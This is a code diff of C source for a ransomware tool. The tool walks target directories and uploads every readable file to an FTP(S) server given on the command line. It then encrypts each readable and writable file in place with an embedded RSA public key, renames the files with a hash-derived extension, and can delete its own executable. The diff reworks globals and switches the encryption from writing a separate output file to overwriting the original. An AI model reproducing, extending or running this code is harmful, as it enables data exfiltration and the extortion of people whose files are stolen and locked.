@@ -26,7 +26,6 @@
 #include "lib/rsa.h"
 #include "lib/log.h"
 
-#include <openssl/evp.h>
 #include <curl/curl.h>
 
 #include <stdlib.h>
@@ -37,22 +36,20 @@
 #include <fcntl.h>
 #include <stdio.h>
 
-/* shared handler data */
-lp_traverser_t trav;
-bool           confirm = false;
+static bool confirm = false; /* confirm for SIGINT */
 
-char *ftp_creds = NULL;
-char *ftp_url   = NULL;
+static char *ftp_creds = NULL; /* FTP(S) credentials, "user:pwd" form */
+static char *ftp_url   = NULL; /* FTP(S) base URL */
 
-EVP_PKEY *pub_key = NULL;
-char      pub_hash[LP_SHA256_SIZE];
-char      pub_ext[7] = {0};
+static char pub_hash[LP_SHA256_SIZE]; /* public key hash */
+static char pub_ext[7] = {0}; /* file extension (calculated from hash) */
 
 int quit(int code) {
   /* free resources */
-  lp_traverser_free(&trav);
-  lp_rsa_key_free(pub_key);
+  lp_traverser_free();
+  lp_rsa_key_free();
   free(ftp_creds);
+  opt_free();
 
   /* exit (never returns) */
   exit(code);
@@ -120,42 +117,33 @@ free:
     fclose(file);
 
   free(url);
-  free(path);
 }
 
 void encrypt_handler(char *path) {
-  bool        ret = false;
-  lp_rsa_t    rsa;
-  struct stat st;
-  uint8_t     buf[LP_RSA_BLOCK_SIZE];
+  bool     ret = false;
+  lp_rsa_t rsa;
 
-  /* input file */
-  int   in = -1, in_len = 0, in_file_len = strlen(path);
-  char *in_file = path;
+  /* file stuff */
+  int     fd = -1, in_len = 0, out_len = 0;
+  uint8_t buf[LP_RSA_BLOCK_SIZE];
 
-  /* output file */
-  int   out = -1, out_len = 0, out_file_len = in_file_len + sizeof(pub_ext);
-  char *out_file = calloc(1, out_file_len + 1);
+  /* path stuff */
+  int   new_path_len = strlen(path) + sizeof(pub_ext);
+  char *new_path     = calloc(1, new_path_len + 1);
 
   /* initialize the RSA structure with the public key */
-  lp_rsa_init(&rsa, pub_key);
+  lp_rsa_init(&rsa);
 
   /* output file name */
-  if (snprintf(out_file, out_file_len + 1, "%s.%s", path, pub_ext) !=
-      out_file_len) {
+  if (snprintf(new_path, new_path_len + 1, "%s.%s", path, pub_ext) !=
+      new_path_len) {
     lp_debug("Failed to format output file path: %s", lp_str_error());
     goto free;
   }
 
   /* open the input file */
-  if ((in = open(in_file, O_RDONLY)) < 0) {
-    lp_debug("Failed to open input file %s: %s", in_file, lp_str_error());
-    goto free;
-  }
-
-  /* open the output file */
-  if ((out = open(out_file, O_RDWR | O_CREAT, 0600)) < 0) {
-    lp_debug("Failed to open output file %s: %s", out_file, lp_str_error());
+  if ((fd = open(path, O_RDWR)) < 0) {
+    lp_debug("Failed to open file %s: %s", path, lp_str_error());
     goto free;
   }
 
@@ -165,28 +153,29 @@ void encrypt_handler(char *path) {
     goto free;
   }
 
-  /* save the secret and the IV */
-  if (write(out, rsa.secret, sizeof(rsa.secret)) <= 0) {
-    lp_debug("Failed to write the secret to %s: %s", out_file, lp_str_error());
-    goto free;
-  }
-
-  if (write(out, rsa.iv, sizeof(rsa.iv)) <= 0) {
-    lp_debug("Failed to write the IV to %s: %s", out_file, lp_str_error());
-    goto free;
-  }
-
   /* read from the input file, one block at a time */
-  while ((in_len = read(in, buf, sizeof(buf))) > 0) {
+  while ((in_len = read(fd, buf, sizeof(buf))) > 0) {
     /* encrypt the read full/partial block */
     if (!lp_rsa_encrypt(&rsa, buf, in_len, &out_len)) {
-      lp_debug("Failed to encrypt %s (%lu, %lu)", in_file, in_len, out_len);
+      lp_debug("Failed to encrypt %s (%lu, %lu)", path, in_len, out_len);
+      goto free;
+    }
+
+    /* check the input/output block size */
+    if (out_len > in_len) {
+      lp_debug("Invalid block size for %s: %d > %d", path, out_len, in_len);
+      goto free;
+    }
+
+    /* go back to the start of the block */
+    if (lseek(fd, -in_len, SEEK_CUR) < 0) {
+      lp_debug("Failed to seek to block for %s: %s", path, lp_str_error());
       goto free;
     }
 
     /* write the encrypted full block to the output file */
-    if (out_len != 0 && write(out, buf, out_len) <= 0) {
-      lp_debug("Failed to write output to %s: %s", out_file, lp_str_error());
+    if (out_len != 0 && write(fd, buf, out_len) <= 0) {
+      lp_debug("Failed to write to %s: %s", path, lp_str_error());
       goto free;
     }
 
@@ -201,44 +190,42 @@ void encrypt_handler(char *path) {
     goto free;
   }
 
-  if (write(out, buf, out_len) < 0) {
-    lp_debug("Failed to write last block to %s: %s", out_file, lp_str_error());
+  if (write(fd, buf, out_len) < 0) {
+    lp_debug("Failed to write last block to %s: %s", path, lp_str_error());
     goto free;
   }
 
-  /* get and copy the file info */
-  if (fstat(in, &st) < 0) {
-    lp_debug("Failed to get stat of file: %s", in_file);
+  /* save the secret and the IV */
+  if (write(fd, rsa.secret, sizeof(rsa.secret)) <= 0) {
+    lp_debug("Failed to write the secret to %s: %s", path, lp_str_error());
     goto free;
   }
 
-  if (!lp_copy_stat(out, &st)) {
-    lp_debug("Failed to copy perms from %s to %s", out_file, in_file);
+  if (write(fd, rsa.iv, sizeof(rsa.iv)) <= 0) {
+    lp_debug("Failed to write the IV to %s: %s", path, lp_str_error());
     goto free;
   }
 
-  /* remove the input file */
-  if (unlink(in_file) < 0) {
-    lp_debug("Failed to unlink input file: %s", in_file);
+  /* close the file */
+  close(fd);
+  fd = -1;
+
+  /* rename the file */
+  if (rename(path, new_path) != 0) {
+    lp_debug("Failed to rename %s to %s", path, new_path);
     goto free;
   }
 
   ret = true;
 
 free:
-  if (in >= 0)
-    close(in);
+  if (fd >= 0)
+    close(fd);
 
-  if (out >= 0)
-    close(out);
+  if (!ret)
+    lp_fail("Failed to encrypt %s", path);
 
-  if (!ret) {
-    lp_fail("Failed to encrypt %s", in_file);
-    unlink(out_file);
-  }
-
-  free(in_file);
-  free(out_file);
+  free(new_path);
   lp_rsa_free(&rsa);
 }
 
@@ -248,14 +235,11 @@ int main(int argc, char **argv) {
 
   /* options */
   char  *ftp_usr = NULL, *ftp_pwd = NULL, **cur = NULL;
-  char **paths = NULL, **exts = NULL;
+  char **paths = NULL, **target = NULL, *ignore[2] = {NULL, NULL};
   int    threads;
 
   /* temporary stuff */
   int i, len;
-
-  /* initialize the traverser */
-  lp_traverser_init(&trav);
 
   /* setup the signal handler */
   sigemptyset(&action.sa_mask);
@@ -271,7 +255,7 @@ int main(int argc, char **argv) {
     /* check for the help option */
     if (lp_streq(argv[i], "-h") || lp_streq(argv[i], "--help")) {
       opt_help();
-      quit(EXIT_SUCCESS);
+      quit(EXIT_FAILURE);
     }
 
     if (!opt_parse(argv[i]))
@@ -282,17 +266,16 @@ int main(int argc, char **argv) {
   opt_print();
 
   /* load and check the target path and the extensions option */
-  paths = opt_list("paths");
-  exts  = opt_list("exts");
+  paths  = opt_list("paths");
+  target = opt_list("exts");
 
-  if (opt_empty(paths)) {
+  if (NULL == *paths || **paths == 0) {
     lp_fail("Please specify at least one target directory");
     quit(EXIT_FAILURE);
   }
 
-  /* TODO: match any extension if no extension is specified */
-  if (opt_empty(exts))
-    exts = NULL;
+  if (opt_is_empty_list(target))
+    target = NULL;
 
   /* obtain & check the FTP(S) URL and the credentials */
   ftp_usr = opt_str("ftp-user");
@@ -332,62 +315,81 @@ int main(int argc, char **argv) {
     quit(EXIT_FAILURE);
   }
 
-  /* load all the public key stuff */
-  lp_sha256(LP_PUBKEY, pub_hash);
-  snprintf(pub_ext, sizeof(pub_ext), "%.6s", pub_hash);
+  /*
 
-  if (NULL == (pub_key = lp_rsa_key_load())) {
+   * after the encryption, a new extension will be added to the file names, this
+   * extension is essentially calculated from the public key, it's the first 6
+   * characters of the SHA256 hash of the public key
+
+  */
+  if (NULL == lp_sha256(LP_PUBKEY, pub_hash)) {
+    lp_fail("Failed to calculate SHA256 sum of the public key");
+    quit(EXIT_FAILURE);
+  }
+
+  if (snprintf(pub_ext, sizeof(pub_ext), "%.6s", pub_hash) !=
+      sizeof(pub_ext) - 1) {
+    lp_fail("Failed to format the file extension: %s", lp_str_error());
+    quit(EXIT_FAILURE);
+  }
+
+  /* add encrypted file extension to the ignore list */
+  ignore[0] = pub_ext;
+  ignore[1] = NULL;
+
+  /* load the RSA public key */
+  if (!lp_rsa_key_load()) {
     lp_fail("Failed to load the public key, is the key valid?");
     quit(EXIT_FAILURE);
   }
 
-  /* setup the traverser (see lib/traverse.c) */
-  if (!lp_traverser_setup(&trav, threads, exts)) {
-    lp_fail("Failed to create a traverser: %s", lp_str_error());
+  /* initialize the traverser */
+  if (!lp_traverser_init(threads, target, ignore)) {
+    lp_fail("Failed to initialize the traverser: %s", lp_str_error());
     quit(EXIT_FAILURE);
   }
+
+  /*
+
+   * configure the traverser, we'll first use it to find all the files we can
+   * read and upload them to the FTP(S) server using the upload_handler()
+
+  */
+  lp_traverser_set_mode(R_OK);
+  lp_traverser_set_handler(upload_handler);
 
   /* quitting with SIGINT after this point will require confirmation */
   confirm = true;
 
-  /*
-
-   * use traverser to travese all the target paths and upload all the files we
-   * can read to the FTP(S) server using the upload_handler() (unless FTP(S) is
-   * disabled with no-ftp)
-
-  */
-  lp_traverser_set_mode(&trav, R_OK);
-  lp_traverser_set_handler(&trav, upload_handler);
-
   for (cur = paths; !opt_bool("no-ftp") && NULL != *cur; cur++) {
     lp_info("Uploading %s", *cur);
-    lp_traverser_run(&trav, *cur);
+    lp_traverser_run(*cur);
   }
 
-  if (!lp_traverser_wait(&trav, opt_bool("progress"))) {
-    lp_fail("Failed to wait for upload threads: %s", lp_str_error());
-    quit(EXIT_FAILURE);
-  }
+  /* wait for all the threads */
+  lp_traverser_wait(opt_bool("progress"));
 
   /*
 
-   * now use the traverser to find all the files we can read AND write, and
-   * encrypt them using the encrypt_handler()
+
+   * now reconfigure the traverser to find all the files we can read AND write
+   * and encrypt them using the encrypt_handler()
 
   */
-  lp_traverser_set_mode(&trav, R_OK | W_OK);
-  lp_traverser_set_handler(&trav, encrypt_handler);
+  lp_traverser_set_mode(R_OK | W_OK);
+  lp_traverser_set_handler(encrypt_handler);
 
   for (cur = paths; NULL != *cur; cur++) {
     lp_info("Encrypting %s", *cur);
-    lp_traverser_run(&trav, *cur);
+    lp_traverser_run(*cur);
   }
 
-  if (!lp_traverser_wait(&trav, opt_bool("progress"))) {
-    lp_fail("Failed to wait for encryption threads: %s", lp_str_error());
-    quit(EXIT_FAILURE);
-  }
+  /* wait for all the threads */
+  lp_traverser_wait(opt_bool("progress"));
+
+  /* self destruct */
+  if (opt_bool("destruct"))
+    unlink(argv[0]);
 
   lp_success("Operation completed");
   return quit(EXIT_SUCCESS);
